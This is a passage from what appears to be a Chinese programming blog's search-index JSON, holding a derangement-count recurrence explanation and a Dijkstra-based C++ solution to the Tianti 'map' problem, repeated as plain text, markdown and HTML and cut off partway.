假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能\n  - 假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能\n- 为什么没有其他可能？\n  - 因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况\n\n## ACM题\n\n- hdu2049","content":"<h2 id=\"错排数的定义\"><a href=\"#错排数的定义\" class=\"headerlink\" title=\"错排数的定义\"></a>错排数的定义</h2><ul>\n<li>假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能</li>\n</ul>\n<h2 id=\"递推公式\"><a href=\"#递推公式\" class=\"headerlink\" title=\"递推公式\"></a>递推公式</h2><ul>\n<li>设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ </li>\n<li>解释如下<ul>\n<li>假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能</li>\n<li>假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能</li>\n</ul>\n</li>\n<li>为什么没有其他可能？<ul>\n<li>因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"ACM题\"><a href=\"#ACM题\" class=\"headerlink\" title=\"ACM题\"></a>ACM题</h2><ul>\n<li>hdu2049</li>\n</ul>\n","slug":"组合数之错排数","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"组合数","slug":"组合数","permalink":"https://h-zex.github.io/tags/组合数/"},{"name":"错排","slug":"错排","permalink":"https://h-zex.github.io/tags/错排/"}]},{"title":"天梯L3 007 天梯地图","date":"2018-05-13T07:10:04.000Z","path":"2018/05/13/天梯L3-007-天梯地图/","text":"题目 输入示例一123456789101112131415161710 150 1 0 1 18 0 0 1 14 8 1 1 15 4 0 2 35 9 1 1 40 6 0 1 17 3 1 1 28 3 1 1 22 5 0 2 22 1 1 1 11 5 0 1 31 4 0 1 19 7 1 1 33 1 0 2 56 3 1 2 15 3 输出示例一12Time = 6: 5 =&gt; 4 =&gt; 8 =&gt; 3Distance = 3: 5 =&gt; 1 =&gt; 3 输入示例二12345678910117 90 4 1 1 11 6 1 3 12 6 1 1 12 5 1 2 23 0 0 1 13 1 1 3 13 2 1 2 14 5 0 2 26 5 1 2 13 5 输出示例二1Time = 3; Distance = 4: 3 =&gt; 2 =&gt; 5 Dijstra算法 bfs+优先队列其实就是dijstra算法 dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ Dijstra找出所有最短路径 从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。 具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如vector&lt;int&gt; parent[600] ，则parent[n] 代表的vector就是编号为n的节点的parent list 然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。 需要注意的点不可以这样寻找同代价的不同parent 节点 代码 12345678910111213141516// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价// 其实edge t就代表了节点mestruct Edge_t &#123; int me; int p; int t; Edge_t(int m, int h, int y) : me(m), p(h), t(y) &#123;&#125; bool operator&lt;(const Edge_t &amp;x) const &#123; return x.t &lt; this-&gt;t; &#125;&#125;;while (!que.empty()) &#123; Edge_t t = que.top(); que.pop(); while (!que.empty() &amp;&amp; que.top().t == t.t &amp;&amp; que.top().me == t.me) ...&#125; 可能某Edge h 确实跟pop出来的Edge t是代表的是同一个节点——也就是h.me==t.me ，并且代价相同。但是在堆中，还有同等代价的Edge p，其终点不是t.me ——也就是p.me!=t.me ，然后该Edge p 在堆中的位置处在Edge h 前面，所以上面那个while就没办法获得Edge h 从而无法获取完整的parent list。 另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出Edge t 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里 考虑自循环边 直接判断要求某点A邻接的点不与A相同即可实现 因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意 dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法 INF的取值要注意 dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得INF+weight[i]不再是INF 自己生成数据对拍时 要注意不要生成多重边，网上很多ac的代码都是不支持多重边的 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define INF 0x3f3f3f3fusing namespace std;struct Node &#123; int index; vector&lt;int&gt; adj;&#125;;Node v[600];int length[600][600]; // length[i][j]记录从node i到node j的lengthint TIME[600][600]; // TIME[i][j]记录从node i到node j的用时vector&lt;int&gt; tp[600];// node's parent listint tpResult[600];// 最终的node的parentint BEGIN, END; // 题目输入的天梯队员的起点和要到达的终点int vertexCnt, edgeCnt;int dijstra(int weight[][600]);int DFS(bool isLength);void outp(int f, int index);int main(int argc, char** argv) &#123; int n, m; while (~scanf(\"%d%d\", &amp;n, &amp;m)) &#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; TIME[i][j] = INF; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; length[i][j] = INF; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; v[i].index = i; v[i].adj.clear(); &#125; for (int i = 0; i &lt; n; i++) &#123; tp[i].clear(); &#125; vertexCnt = n, edgeCnt = m; int v1, v2, one, l, t; for (int i = 0; i &lt; m; i++) &#123; scanf(\"%d%d%d%d%d\", &amp;v1, &amp;v2, &amp;one, &amp;l, &amp;t); v[v1].adj.push_back(v2); // 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可 length[v1][v2] = length[v1][v2] &lt; l ? length[v1][v2] : l; TIME[v1][v2] = TIME[v1][v2] &lt; t ? TIME[v1][v2] : t; if (!one) &#123; v[v2].adj.push_back(v1); length[v2][v1] = length[v2][v1] &lt; l ? length[v2][v1] : l; TIME[v2][v1] = TIME[v2][v1] &lt; t ? TIME[v2][v1] : t; &#125; &#125; scanf(\"%d%d\", &amp;BEGIN, &amp;END); if (BEGIN == END) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; \"0\" &lt;&lt; \"; Distance = \" &lt;&lt; \"0\" &lt;&lt; \": \"; cout &lt;&lt; BEGIN &lt;&lt; \" =&gt; \" &lt;&lt; END &lt;&lt; endl; continue; &#125; if (n == 2) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; TIME[BEGIN][END] &lt;&lt; \"; Distance = \" &lt;&lt; length[BEGIN][END] &lt;&lt; \": \"; cout &lt;&lt; BEGIN &lt;&lt; \" =&gt; \" &lt;&lt; END &lt;&lt; endl; continue; &#125; int timeEND = dijstra(TIME);// outp(END, 0); DFS(false); vector&lt;int&gt; r1, r2; r1.push_back(END); // 以下这种构造路径的方式是建立在起点不同于终点的情况下 int tmp_tp = tpResult[END]; r1.push_back(tmp_tp); while (tmp_tp != BEGIN) &#123; tmp_tp = tpResult[tmp_tp]; r1.push_back(tmp_tp); &#125; reverse(r1.begin(), r1.end()); for (int i = 0; i &lt; n; i++) &#123; tp[i].clear(); &#125; int lenEND = dijstra(length);// outp(END, 0); DFS(true); r2.push_back(END); tmp_tp = tpResult[END]; r2.push_back(tmp_tp); while (tmp_tp != BEGIN) &#123; tmp_tp = tpResult[tmp_tp]; r2.push_back(tmp_tp); &#125; reverse(r2.begin(), r2.end()); bool isSame = false; if (r1.size() == r2.size()) &#123; isSame = true; for (int i = 0; i &lt; r1.size(); i++) &#123; isSame = (r1[i] == r2[i]) &amp;&amp; isSame; &#125; &#125; if (isSame) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; timeEND &lt;&lt; \"; Distance = \" &lt;&lt; lenEND &lt;&lt; \": \"; for (int i = 0; i &lt; r1.size() - 1; i++) &#123; cout &lt;&lt; r1[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r1[r1.size() - 1] &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"Time = \" &lt;&lt; timeEND &lt;&lt; \": \"; for (int i = 0; i &lt; r1.size() - 1; i++) &#123; cout &lt;&lt; r1[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r1[r1.size() - 1] &lt;&lt; endl; cout &lt;&lt; \"Distance = \" &lt;&lt; lenEND &lt;&lt; \": \"; for (int i = 0; i &lt; r2.size() - 1; i++) &#123; cout &lt;&lt; r2[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r2[r2.size() - 1] &lt;&lt; endl; &#125; &#125;&#125;// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价struct Edge_t &#123; int me; int p; int t; Edge_t(int m, int h, int y) : me(m), p(h), t(y) &#123;&#125; bool operator&lt;(const Edge_t &amp;x) const &#123; return x.t &lt; this-&gt;t; &#125;&#125;;// bfs+优先队列其实就是dijstra算法// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到// 所以result set只会有node被加进去而不会有node被踢出去// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，int dijstra(int weight[][600]) &#123; int resWei[600]; priority_queue&lt;Edge_t&gt; que; que.push(Edge_t(BEGIN, 0, 0));// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0 int cnt = 0; bool visit[vertexCnt]; // 记录某点是否已经加入到dijstra的result set里 memset(visit, 0, sizeof(visit) * sizeof(bool)); while (!que.empty()) &#123; Edge_t t = que.top(); que.pop(); // 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里 if (visit[t.me]) &#123; assert(resWei[t.me] &lt;= t.t); if (resWei[t.me] == t.t) &#123; tp[t.me].push_back(t.p); &#125; continue; &#125; visit[t.me] = true; tp[t.me].push_back(t.p); resWei[t.me] = t.t; const vector&lt;int&gt; &amp;adj = v[t.me].adj; int al = adj.size(); for (int i = 0; i &lt; al; i++) &#123; if (adj[i] == t.me) continue; que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]])); &#125; &#125; return resWei[END];&#125;int dp[600];bool dpVisit[600];static int __dfs(int f, bool isLength);int DFS(bool isLength) &#123; memset(dp, 0xff, sizeof(dp)); memset(tpResult, 0, sizeof(tpResult)); memset(dpVisit, 0, sizeof(dpVisit)); return __dfs(END, isLength);&#125;static int __dfs(int f, bool isLength) &#123; if (dp[f] &gt; -1) &#123; return dp[f]; &#125; if (f == BEGIN) &#123; return 0; &#125; const vector&lt;int&gt; &amp;t = tp[f]; int result = INF; for (int i = 0; i &lt; t.size(); i++) &#123; if(t[i]==f) continue; if (dpVisit[t[i]]) // 代表该节点在这条路径上已经被访问过 continue; dpVisit[f] = true; int p = __dfs(t[i], isLength) + (isLength ? 1 : length[t[i]][f]); dpVisit[f] = false; if (p &lt; result) &#123; tpResult[f] = t[i]; result = p; &#125; &#125; dp[f] = result; return result;&#125;int path[600];bool outpVisit[600];void outp(int f, int index) &#123; outpVisit[f] = true; if (f == BEGIN) &#123; cout &lt;&lt; \"outp: \"; for (int i = 0; i &lt; index; i++) &#123; cout &lt;&lt; path[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; outpVisit[f] = true; return; &#125; path[index] = f; const vector&lt;int&gt; &amp;t = tp[f]; for (int i = 0; i &lt; t.size(); i++) &#123; if (outpVisit[t[i]])// means that 前辈们已经访问过了，再访问就成环了 continue; outp(t[i], index + 1); &#125; outpVisit[f] = false; return;&#125;","raw":"---\ntitle: 天梯L3 007 天梯地图\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-13 15:10:04\ntags:\n- Dijstra最短路\n- 天梯赛\ndescription: Dijstra最短路变形\ncategories:\n- 算法\n---\n\n## 题目\n\n{% asset_img 1.png %}\n\n#### 输入示例一\n\n```\n10 15\n0 1 0 1 1\n8 0 0 1 1\n4 8 1 1 1\n5 4 0 2 3\n5 9 1 1 4\n0 6 0 1 1\n7 3 1 1 2\n8 3 1 1 2\n2 5 0 2 2\n2 1 1 1 1\n1 5 0 1 3\n1 4 0 1 1\n9 7 1 1 3\n3 1 0 2 5\n6 3 1 2 1\n5 3\n```\n\n#### 输出示例一\n\n```\nTime = 6: 5 => 4 => 8 => 3\nDistance = 3: 5 => 1 => 3\n```\n\n#### 输入示例二\n\n```\n7 9\n0 4 1 1 1\n1 6 1 3 1\n2 6 1 1 1\n2 5 1 2 2\n3 0 0 1 1\n3 1 1 3 1\n3 2 1 2 1\n4 5 0 2 2\n6 5 1 2 1\n3 5\n```\n\n#### 输出示例二\n\n```\nTime = 3; Distance = 4: 3 => 2 => 5\n```\n\n## Dijstra算法\n\n- bfs+优先队列其实就是dijstra算法\n- dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去\n- 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ \n\n## Dijstra找出所有最短路径\n\n- 从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。\n- 具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如`vector<int> parent[600]` ，则`parent[n]` 代表的vector就是编号为n的节点的parent list\n- 然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。\n\n## 需要注意的点\n\n#### 不可以这样寻找同代价的不同parent 节点\n\n- 代码\n\n  ```cpp\n  // 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价\n  // 其实edge t就代表了节点me\n  struct Edge_t {\n      int me;\n      int p;\n      int t;\n      Edge_t(int m, int h, int y) : me(m), p(h), t(y) {} \n      bool operator<(const Edge_t &x) const { return x.t < this->t; }\n  };\n\n  while (!que.empty()) {\n      Edge_t t = que.top();\n      que.pop();\n      while (!que.empty() && que.top().t == t.t && que.top().me == t.me)\n      ...\n  }\n  ```\n\n- 可能某`Edge h` 确实跟pop出来的`Edge t`是代表的是同一个节点——也就是`h.me==t.me` ，并且代价相同。但是在堆中，还有同等代价的`Edge p`，其终点不是`t.me` ——也就是`p.me!=t.me` ，然后该`Edge p` 在堆中的位置处在`Edge h` 前面，所以上面那个while就没办法获得`Edge h` 从而无法获取完整的parent list。\n\n- 另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出`Edge t` 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里\n\n#### 考虑自循环边\n\n- 直接判断要求某点A邻接的点不与A相同即可实现\n\n#### 因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\n\n- dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法\n\n#### INF的取值要注意\n\n- dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得`INF+weight[i]`不再是INF\n\n#### 自己生成数据对拍时\n\n- 要注意不要生成多重边，网上很多ac的代码都是不支持多重边的\n\n## 代码\n\n```cpp\n#include <algorithm>\n#include <cassert>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <iostream>\n#include <queue>\n#include <vector>\n#define INF 0x3f3f3f3f\n\nusing namespace std;\nstruct Node {\n    int index;\n    vector<int> adj;\n};\nNode v[600];\nint length[600][600]; // length[i][j]记录从node i到node j的length\nint TIME[600][600]; // TIME[i][j]记录从node i到node j的用时\nvector<int> tp[600];// node's parent list\nint tpResult[600];// 最终的node的parent\n\nint BEGIN, END; // 题目输入的天梯队员的起点和要到达的终点\nint vertexCnt, edgeCnt;\n\nint dijstra(int weight[][600]);\nint DFS(bool isLength);\nvoid outp(int f, int index);\n\nint main(int argc, char** argv) {\n    int n, m;\n    while (~scanf(\"%d%d\", &n, &m)) {\n        for (int i = 0; i < n; i++) {\n            for (int j = 0; j < n; j++) {\n                TIME[i][j] = INF;\n            }\n        }\n        for (int i = 0; i < n; i++) {\n            for (int j = 0; j < n; j++) {\n                length[i][j] = INF;\n            }\n        }\n        for (int i = 0; i < n; i++) {\n            v[i].index = i;\n            v[i].adj.clear();\n        }\n        for (int i = 0; i < n; i++) {\n            tp[i].clear();\n        }\n\n        vertexCnt = n, edgeCnt = m;\n        int v1, v2, one, l, t;\n        for (int i = 0; i < m; i++) {\n            scanf(\"%d%d%d%d%d\", &v1, &v2, &one, &l, &t);\n            v[v1].adj.push_back(v2);\n            // 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可\n            length[v1][v2] = length[v1][v2] < l ? length[v1][v2] : l;\n            TIME[v1][v2] = TIME[v1][v2] < t ? TIME[v1][v2] : t;\n            if (!one) {\n                v[v2].adj.push_back(v1);\n                length[v2][v1] = length[v2][v1] < l ? length[v2][v1] : l;\n                TIME[v2][v1] = TIME[v2][v1] < t ? TIME[v2][v1] : t;\n            }\n        }\n        scanf(\"%d%d\", &BEGIN, &END);\n        if (BEGIN == END) {\n            cout << \"Time = \"\n                 << \"0\"\n                 << \"; Distance = \"\n                 << \"0\"\n                 << \": \";\n            cout << BEGIN << \" => \" << END << endl;\n            continue;\n        }\n        if (n == 2) {\n            cout << \"Time = \" << TIME[BEGIN][END] << \"; Distance = \" << length[BEGIN][END] << \": \";\n            cout << BEGIN << \" => \" << END << endl;\n            continue;\n        }\n\n        int timeEND = dijstra(TIME);\n//        outp(END, 0);\n        DFS(false);\n        vector<int> r1, r2;\n        r1.push_back(END);\n        // 以下这种构造路径的方式是建立在起点不同于终点的情况下\n        int tmp_tp = tpResult[END];\n        r1.push_back(tmp_tp);\n        while (tmp_tp != BEGIN) {\n            tmp_tp = tpResult[tmp_tp];\n            r1.push_back(tmp_tp);\n        }\n        reverse(r1.begin(), r1.end());\n\n        for (int i = 0; i < n; i++) {\n            tp[i].clear();\n        }\n        int lenEND = dijstra(length);\n//        outp(END, 0);\n        DFS(true);\n        r2.push_back(END);\n        tmp_tp = tpResult[END];\n        r2.push_back(tmp_tp);\n        while (tmp_tp != BEGIN) {\n            tmp_tp = tpResult[tmp_tp];\n            r2.push_back(tmp_tp);\n        }\n        reverse(r2.begin(), r2.end());\n\n        bool isSame = false;\n        if (r1.size() == r2.size()) {\n            isSame = true;\n            for (int i = 0; i < r1.size(); i++) {\n                isSame = (r1[i] == r2[i]) && isSame;\n            }\n        }\n        if (isSame) {\n            cout << \"Time = \" << timeEND << \"; Distance = \" << lenEND << \": \";\n            for (int i = 0; i < r1.size() - 1; i++) {\n                cout << r1[i] << \" => \";\n            }\n            cout << r1[r1.size() - 1] << endl;\n        } else {\n            cout << \"Time = \" << timeEND << \": \";\n            for (int i = 0; i < r1.size() - 1; i++) {\n                cout << r1[i] << \" => \";\n            }\n            cout << r1[r1.size() - 1] << endl;\n            cout << \"Distance = \" << lenEND << \": \";\n            for (int i = 0; i < r2.size() - 1; i++) {\n                cout << r2[i] << \" => \";\n            }\n            cout << r2[r2.size() - 1] << endl;\n        }\n    }\n}\n\n// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价\nstruct Edge_t {\n    int me;\n    int p;\n    int t;\n    Edge_t(int m, int h, int y) : me(m), p(h), t(y) {} \n    bool operator<(const Edge_t &x) const { return x.t < this->t; }\n};\n\n// bfs+优先队列其实就是dijstra算法\n// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到\n// 所以result set只会有node被加进去而不会有node被踢出去\n// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，\nint dijstra(int weight[][600]) {\n    int resWei[600];\n    priority_queue<Edge_t> que;\n    que.push(Edge_t(BEGIN, 0, 0));// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0\n    int cnt = 0;\n    bool visit[vertexCnt];  // 记录某点是否已经加入到dijstra的result set里\n    memset(visit, 0, sizeof(visit) * sizeof(bool));\n    while (!que.empty()) {\n        Edge_t t = que.top();\n        que.pop();\n        // 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里\n        if (visit[t.me]) {\n            assert(resWei[t.me] <= t.t);\n            if (resWei[t.me] == t.t) {\n                tp[t.me].push_back(t.p);\n            }\n            continue;\n        }\n        visit[t.me] = true;\n        tp[t.me].push_back(t.p);\n        resWei[t.me] = t.t;\n        const vector<int> &adj = v[t.me].adj;\n        int al = adj.size();\n        for (int i = 0; i < al; i++) {\n            if (adj[i] == t.me)\n                continue;\n            que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]]));\n        }\n    }\n    return resWei[END];\n}\n\nint dp[600];\nbool dpVisit[600];\nstatic int __dfs(int f, bool isLength);\nint DFS(bool isLength) {\n    memset(dp, 0xff, sizeof(dp));\n    memset(tpResult, 0, sizeof(tpResult));\n    memset(dpVisit, 0, sizeof(dpVisit));\n    return __dfs(END, isLength);\n}\nstatic int __dfs(int f, bool isLength) {\n    if (dp[f] > -1) {\n        return dp[f];\n    }\n    if (f == BEGIN) {\n        return 0;\n    }\n    const vector<int> &t = tp[f];\n    int result = INF;\n    for (int i = 0; i < t.size(); i++) {\n        if(t[i]==f)\n            continue;\n        if (dpVisit[t[i]])  // 代表该节点在这条路径上已经被访问过\n            continue;\n        dpVisit[f] = true;\n        int p = __dfs(t[i], isLength) + (isLength ? 1 : length[t[i]][f]);\n        dpVisit[f] = false;\n        if (p < result) {\n            tpResult[f] = t[i];\n            result = p;\n        }\n    }\n    dp[f] = result;\n    return result;\n}\n\nint path[600];\nbool outpVisit[600];\nvoid outp(int f, int index) {\n    outpVisit[f] = true;\n    if (f == BEGIN) {\n        cout << \"outp: \";\n        for (int i = 0; i < index; i++) {\n            cout << path[i] << \" \";\n        }\n        cout << endl;\n        outpVisit[f] = true;\n        return;\n    }\n    path[index] = f;\n    const vector<int> &t = tp[f];\n    for (int i = 0; i < t.size(); i++) {\n        if (outpVisit[t[i]])// means that 前辈们已经访问过了，再访问就成环了\n            continue;\n        outp(t[i], index + 1);\n    }\n    outpVisit[f] = false;\n    return;\n}\n```","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><img src=\"/2018/05/13/天梯L3-007-天梯地图/1.png\">\n<h4 id=\"输入示例一\"><a href=\"#输入示例一\" class=\"headerlink\" title=\"输入示例一\"></a>输入示例一</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10 15</span><br><span class=\"line\">0 1 0 1 1</span><br><span class=\"line\">8 0 0 1 1</span><br><span class=\"line\">4 8 1 1 1</span><br><span class=\"line\">5 4 0 2 3</span><br><span class=\"line\">5 9 1 1 4</span><br><span class=\"line\">0 6 0 1 1</span><br><span class=\"line\">7 3 1 1 2</span><br><span class=\"line\">8 3 1 1 2</span><br><span class=\"line\">2 5 0 2 2</span><br><span class=\"line\">2 1 1 1 1</span><br><span class=\"line\">1 5 0 1 3</span><br><span class=\"line\">1 4 0 1 1</span><br><span class=\"line\">9 7 1 1 3</span><br><span class=\"line\">3 1 0 2 5</span><br><span class=\"line\">6 3 1 2 1</span><br><span class=\"line\">5 3</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出示例一\"><a href=\"#输出示例一\" class=\"headerlink\" title=\"输出示例一\"></a>输出示例一</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Time = 6: 5 =&gt; 4 =&gt; 8 =&gt; 3</span><br><span class=\"line\">Distance = 3: 5 =&gt; 1 =&gt; 3</span><br></pre></td></tr></table></figure>\n<h4 id=\"输入示例二\"><a href=\"#输入示例二\" class=\"headerlink\" title=\"输入示例二\"></a>输入示例二</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7 9</span><br><span class=\"line\">0 4 1 1 1</span><br><span class=\"line\">1 6 1 3 1</span><br><span class=\"line\">2 6 1 1 1</span><br><span class=\"line\">2 5 1 2 2</span><br><span class=\"line\">3 0 0 1 1</span><br><span class=\"line\">3 1 1 3 1</span><br><span class=\"line\">3 2 1 2 1</span><br><span class=\"line\">4 5 0 2 2</span><br><span class=\"line\">6 5 1 2 1</span><br><span class=\"line\">3 5</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出示例二\"><a href=\"#输出示例二\" class=\"headerlink\" title=\"输出示例二\"></a>输出示例二</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Time = 3; Distance = 4: 3 =&gt; 2 =&gt; 5</span><br></pre></td></tr></table></figure>\n<h2 id=\"Dijstra算法\"><a href=\"#Dijstra算法\" class=\"headerlink\" title=\"Dijstra算法\"></a>Dijstra算法</h2><ul>\n<li>bfs+优先队列其实就是dijstra算法</li>\n<li>dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去</li>\n<li>不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ </li>\n</ul>\n<h2 id=\"Dijstra找出所有最短路径\"><a href=\"#Dijstra找出所有最短路径\" class=\"headerlink\" title=\"Dijstra找出所有最短路径\"></a>Dijstra找出所有最短路径</h2><ul>\n<li>从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。</li>\n<li>具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如<code>vector&lt;int&gt; parent[600]</code> ，则<code>parent[n]</code> 代表的vector就是编号为n的节点的parent 